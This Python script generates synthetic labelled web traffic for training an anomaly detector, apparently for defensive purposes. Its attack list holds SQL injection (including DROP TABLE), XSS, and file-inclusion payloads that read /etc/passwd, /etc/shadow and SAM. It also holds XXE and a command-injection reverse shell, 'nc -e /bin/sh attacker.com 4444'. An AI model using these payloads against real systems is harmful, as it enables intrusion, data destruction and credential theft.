"""
Generate synthetic training data for model training.
"""

import pandas as pd
import random
from datetime import datetime, timedelta
import argparse


def generate_normal_traffic(num_samples: int) -> list:
    """Generate normal traffic samples."""
    samples = []
    
    normal_paths = [
        "/", "/home", "/about", "/contact", "/api/users", "/api/products",
        "/dashboard", "/login", "/logout", "/profile", "/settings"
    ]
    
    methods = ["GET", "POST", "PUT", "DELETE"]
    
    for _ in range(num_samples):
        timestamp = datetime.now() - timedelta(days=random.randint(0, 30))
        
        sample = {
            'source_ip': f"192.168.{random.randint(1, 10)}.{random.randint(1, 255)}",
            'method': random.choice(methods),
            'path': random.choice(normal_paths),
            'body': '',
            'timestamp': timestamp.isoformat(),
            'is_anomaly': 0
        }
        samples.append(sample)
    
    return samples


def generate_anomalous_traffic(num_samples: int) -> list:
    """Generate anomalous traffic samples."""
    samples = []
    
    attack_patterns = [
        # SQL Injection
        "/api/users?id=1' OR '1'='1",
        "/search?q=admin'--",
        "/api/products?id=1 UNION SELECT * FROM users--",
        "/login?user=admin' OR 1=1#",
        "/api/data?filter=1'; DROP TABLE users--",
        
        # XSS
        "/search?q=<script>alert('XSS')</script>",
        "/comment?text=<img src=x onerror=alert(1)>",
        "/profile?name=<script>document.location='evil.com'</script>",
        "/api/post?content=<iframe src='javascript:alert(1)'>",
        
        # LFI
        "/download?file=../../etc/passwd",
        "/view?page=../../../windows/system32/config/sam",
        "/api/file?path=..\\..\\..\\etc\\shadow",
        "/include?page=....//....//etc/passwd",
        
        # Command Injection
        "/ping?host=127.0.0.1;ls -la",
        "/api/exec?cmd=cat /etc/passwd",
        "/run?script=`whoami`",
        "/api/system?cmd=|nc -e /bin/sh attacker.com 4444",
        
        # Path Traversal
        "/files/../../../../../../etc/passwd",
        "/api/download?file=....//....//windows/win.ini",
        
        # XXE
        "/api/xml?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    ]
    
    for _ in range(num_samples):
        timestamp = datetime.now() - timedelta(days=random.randint(0, 30))
        
        sample = {
            'source_ip': f"10.0.{random.randint(0, 5)}.{random.randint(1, 50)}",
            'method': random.choice(["GET", "POST"]),
            'path': random.choice(attack_patterns),
            'body': '',
            'timestamp': timestamp.isoformat(),
            'is_anomaly': 1
        }
        samples.append(sample)
    
    return samples


def generate_dataset(num_normal: int, num_anomalous: int, output_file: str):
    """Generate complete dataset."""
    print(f"Generating dataset...")
    print(f"  Normal samples: {num_normal}")
    print(f"  Anomalous samples: {num_anomalous}")
    
    # Generate samples
    normal_samples = generate_normal_traffic(num_normal)
    anomalous_samples = generate_anomalous_traffic(num_anomalous)
    
    # Combine and shuffle
    all_samples = normal_samples + anomalous_samples
    random.shuffle(all_samples)
    
    # Create DataFrame
    df = pd.DataFrame(all_samples)
    
    # Save to CSV
    df.to_csv(output_file, index=False)
    
    print(f"\nDataset saved to: {output_file}")
    print(f"Total samples: {len(all_samples)}")
    print(f"Normal: {num_normal} ({num_normal/len(all_samples)*100:.1f}%)")
    print(f"Anomalous: {num_anomalous} ({num_anomalous/len(all_samples)*100:.1f}%)")


def main():
    parser = argparse.ArgumentParser(description='Generate synthetic training data')
    parser.add_argument(
        '--normal',
        type=int,
        default=10000,
        help='Number of normal samples'
    )
    parser.add_argument(
        '--anomalous',
        type=int,
        default=1000,
        help='Number of anomalous samples'
    )
    parser.add_argument(
        '--output',
        default='data/training/synthetic_traffic.csv',
        help='Output CSV file path'
    )
    
    args = parser.parse_args()
    
    # Create output directory
    import os
    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    
    # Generate dataset
    generate_dataset(args.normal, args.anomalous, args.output)


if __name__ == '__main__':
    main()
